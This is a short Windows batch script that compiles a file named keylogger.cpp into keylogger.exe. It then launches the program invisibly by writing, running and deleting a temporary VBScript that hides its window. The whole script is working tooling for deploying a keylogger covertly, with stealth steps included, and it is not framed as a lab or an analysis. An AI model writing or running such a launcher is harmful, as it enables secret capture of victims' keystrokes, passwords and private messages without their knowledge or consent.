@echo off

REM
set CppFile=keylogger.cpp
set PyFile=import.py
set LogFile=keylogger.log

REM
echo Compiling %CppFile%...
g++ %CppFile% -o keylogger.exe -w
if %errorlevel% neq 0 (
    echo Compilation failed. Exiting.
    pause
    exit /b
)

REM
echo Starting keylogger in hidden mode...
echo Set WshShell = CreateObject("WScript.Shell") > hide.vbs
echo WshShell.Run """" ^& WScript.Arguments(0) ^& """", 0, False >> hide.vbs
cscript //nologo hide.vbs keylogger.exe
del hide.vbs

REM
exit